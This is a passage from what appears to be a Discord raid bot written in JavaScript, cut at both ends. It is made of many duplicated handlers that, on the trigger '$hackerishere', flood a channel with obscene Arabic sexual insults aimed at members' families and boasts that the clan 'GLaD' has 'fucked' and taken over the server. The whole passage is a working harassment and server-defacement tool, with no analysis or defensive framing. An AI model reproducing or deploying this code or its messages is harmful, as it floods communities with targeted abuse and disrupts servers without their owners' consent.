    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
